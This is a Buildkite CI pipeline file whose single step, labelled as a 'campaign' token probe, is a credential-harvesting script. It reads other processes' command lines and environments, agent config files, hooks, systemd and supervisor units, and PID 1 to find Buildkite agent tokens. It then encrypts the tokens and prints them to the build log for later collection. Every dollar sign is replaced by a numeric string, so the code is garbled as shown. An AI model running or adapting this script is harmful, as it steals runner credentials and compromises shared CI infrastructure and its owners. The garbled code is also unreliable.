steps:
  - label: ":campaign: a632-agenttoken-probe2"
    agents:
      queue: "cuda"
    commands: |
      echo "A632B_BEGIN"
      id; hostname
      echo "CTX cluster=4155013BUILDKITE_CLUSTER_ID queue=4155013BUILDKITE_AGENT_META_DATA_QUEUE agent=4155013BUILDKITE_AGENT_NAME"
      PUB=4155013(mktemp 2>/dev/null || echo /tmp/.a632pub)
      printf '%s' "" | base64 -d > "4155013PUB" 2>/dev/null || true
      encrypt() { v="41550131"; label="41550132"; if [ -n "4155013v" ]; then h=4155013(printf '%s' "4155013v" | sha256sum | cut -c1-12); c=4155013(printf '%s' "4155013v" | openssl pkeyutl -encrypt -pubin -inkey "4155013PUB" 2>/dev/null | base64 -w0); echo "A632ENC:4155013label:4155013h:4155013{c:-ENCFAIL}"; fi; }
      echo "== SRC1 cmdline token args =="
      for p in /proc/[0-9]*; do
        if [ -r "4155013p/cmdline" ]; then tr '\0' '\n' < "4155013p/cmdline" 2>/dev/null | grep -oiE '[-]{0,2}[a-z0-9_-]*token[= ][^ ]+' | sed -E 's/^[^=]*=//; s/^[^ ]+ +//' || true; fi
      done | sort -u | head -20 | while IFS= read -r v; do encrypt "4155013v" "cmdline"; done
      echo "== SRC2 agent process env token names =="
      for p in /proc/[0-9]*; do
        if [ -r "4155013p/environ" ]; then c=4155013(tr '\0' ' ' < "4155013p/cmdline" 2>/dev/null | head -c 120); case "4155013c" in *buildkite-agent*) tr '\0' '\n' < "4155013p/environ" 2>/dev/null | grep -iE 'token' | sed -E 's/^([^=]*)=.*/\1/' || true;; esac; fi
      done | sort -u | head -30
      echo "== SRC2b agent env token values (encrypted) =="
      for p in /proc/[0-9]*; do
        if [ -r "4155013p/environ" ]; then c=4155013(tr '\0' ' ' < "4155013p/cmdline" 2>/dev/null | head -c 120); case "4155013c" in *buildkite-agent*) tr '\0' '\n' < "4155013p/environ" 2>/dev/null | grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN|BUILDKITE_CLUSTER_TOKEN|BUILDKITE_AGENT_ACCESS_TOKEN)=' | while IFS='=' read -r k v; do encrypt "4155013v" "environ:4155013k"; done;; esac; fi
      done
      echo "== SRC3 cfg files =="
      for f in /etc/buildkite-agent/buildkite-agent.cfg /usr/share/buildkite-agent/buildkite-agent.cfg "4155013HOME/.buildkite-agent/buildkite-agent.cfg"; do
        if [ -f "4155013f" ]; then echo "FOUND2 4155013f"; sha256sum "4155013f"; grep -E '^[[:space:]]*(token|token-env)' "4155013f" | sed 's/=.*/=<redacted>/' || true; t=4155013(grep -E '^[[:space:]]*token[[:space:]]*=' "4155013f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*4155013/\1/'); encrypt "4155013t" "cfg2:4155013f"; fi
      done
      echo "== SRC4 hooks =="
      ls -la /hooks/ 2>/dev/null || true
      for h in /hooks/*; do
        if [ -f "4155013h" ]; then echo "HOOK 4155013h"; sha256sum "4155013h"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD)[A-Za-z0-9_]*=[^ ]*' "4155013h" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE '(BUILDKITE[A-Za-z0-9_]*TOKEN)="?[^" ]+"?' "4155013h" 2>/dev/null | while IFS='=' read -r k v; do v=4155013(printf '%s' "4155013v" | tr -d '"'); encrypt "4155013v" "hook:4155013k"; done; fi
      done
      echo "== SRC5 supervisor/systemd =="
      for u in /etc/systemd/system/buildkite-agent*.service /lib/systemd/system/buildkite-agent*.service /etc/supervisor/conf.d/*.conf /etc/supervisor/supervisord.conf /etc/default/buildkite-agent /etc/default/buildkite*; do
        if [ -f "4155013u" ]; then echo "CONF 4155013u"; sha256sum "4155013u"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET)=[^ "]*' "4155013u" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE '(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=[^ "]*' "4155013u" 2>/dev/null | while IFS='=' read -r k v; do encrypt "4155013v" "conf:4155013k"; done; fi
      done
      echo "== SRC6 pid1 =="
      tr '\0' '\n' < /proc/1/cmdline 2>/dev/null | head -5 || true
      tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=' | while IFS='=' read -r k v; do encrypt "4155013v" "pid1:4155013k"; done
      echo "== SRC7 job env secret-shaped names =="
      env | grep -iE 'TOKEN|SECRET|API_KEY|PASSWORD|CREDENTIAL|_KEY' | cut -d= -f1 | sort || true
      echo "== SRC8 home/dirs =="
      ls -la "4155013HOME" 2>/dev/null | head -20 || true
      rm -f "4155013PUB" 2>/dev/null || true
      echo "A632B_END"
